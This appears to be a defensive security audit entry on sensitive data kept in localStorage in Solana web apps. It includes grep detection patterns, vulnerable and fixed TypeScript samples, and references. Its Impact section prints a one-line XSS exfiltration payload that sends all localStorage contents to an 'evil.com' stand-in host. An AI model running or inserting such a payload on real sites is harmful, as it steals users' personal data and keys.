# OC-186: Sensitive Data in localStorage

**Category:** Frontend & Client
**Severity:** HIGH
**Auditors:** FE-01
**CWE:** CWE-922
**OWASP:** A04:2021 - Insecure Design

## Description

The Web Storage API's `localStorage` provides a simple key-value store that persists across browser sessions. Unlike HTTP-only cookies, localStorage has no access control mechanism -- any JavaScript running on the page's origin can read every stored value. This makes it a high-value target for XSS attacks, malicious browser extensions, and compromised third-party scripts.

In the Solana dApp ecosystem, frontend applications frequently store wallet preferences, transaction drafts, RPC endpoint configurations, and user settings in localStorage. If any of this data is sensitive -- such as partial key material, signed message payloads, or user PII -- an XSS vulnerability anywhere on the origin gives the attacker full read access. The data also persists on disk unencrypted, making it accessible to local malware or forensic extraction.

A 2022 Safari vulnerability in IndexedDB same-origin policy enforcement (tracked by FingerprintJS) demonstrated that browser storage isolation can fail. Even without browser bugs, the fundamental issue remains: localStorage is JavaScript-accessible by design, with no encryption, no expiry, and no integrity protection.

## Detection

```
# Direct localStorage usage with sensitive-sounding keys
grep -rn "localStorage\.setItem\|localStorage\.getItem" --include="*.ts" --include="*.tsx" --include="*.js"
grep -rn "localStorage.*token\|localStorage.*secret\|localStorage.*key\|localStorage.*password\|localStorage.*seed\|localStorage.*mnemonic" -i --include="*.ts" --include="*.tsx"

# Wallet/auth data patterns
grep -rn "localStorage.*wallet\|localStorage.*auth\|localStorage.*session\|localStorage.*credential" -i --include="*.ts" --include="*.tsx"

# window.localStorage references
grep -rn "window\.localStorage" --include="*.ts" --include="*.tsx"
```

## Vulnerable Code

```typescript
// Solana dApp storing sensitive user data in localStorage
import { useWallet } from '@solana/wallet-adapter-react';

function WalletDashboard() {
  const { publicKey } = useWallet();

  const saveUserProfile = async (profile: UserProfile) => {
    // VULNERABLE: PII and financial data in localStorage
    localStorage.setItem('user_profile', JSON.stringify({
      walletAddress: publicKey?.toBase58(),
      email: profile.email,
      kycStatus: profile.kycStatus,
      portfolioValue: profile.portfolioValue,
      rpcApiKey: process.env.NEXT_PUBLIC_RPC_KEY, // Leaking API key too
    }));
  };

  const loadPreferences = () => {
    // VULNERABLE: Any XSS can read this
    const data = localStorage.getItem('user_profile');
    return data ? JSON.parse(data) : null;
  };

  return <div>{/* ... */}</div>;
}
```

## Secure Code

```typescript
// Use server-side session storage for sensitive data
import { useWallet } from '@solana/wallet-adapter-react';

function WalletDashboard() {
  const { publicKey } = useWallet();

  const saveUserProfile = async (profile: UserProfile) => {
    // SECURE: Store sensitive data server-side, reference by session
    await fetch('/api/user/profile', {
      method: 'PUT',
      credentials: 'include', // Uses HttpOnly session cookie
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        walletAddress: publicKey?.toBase58(),
        email: profile.email,
      }),
    });

    // Only store non-sensitive UI preferences client-side
    localStorage.setItem('ui_preferences', JSON.stringify({
      theme: profile.theme,
      language: profile.language,
    }));
  };

  return <div>{/* ... */}</div>;
}
```

## Impact

An attacker who achieves XSS on the application origin can exfiltrate all localStorage contents with a single line: `fetch('https://evil.com/steal?d=' + btoa(JSON.stringify(localStorage)))`. This can expose PII, API keys, wallet metadata, portfolio data, and any other sensitive information stored client-side. The data persists even after the XSS vector is patched, as it remains on disk until explicitly cleared.

## References

- CWE-922: Insecure Storage of Sensitive Information
- OWASP WSTG-CLNT-12: Testing Browser Storage
- FingerprintJS: Safari IndexedDB Same-Origin Policy Bypass (2022)
- Raxis: "Dangers of Storing Sensitive Data in Web Storage" -- 5 attack scenarios
- OWASP Client-Side Storage Guidelines
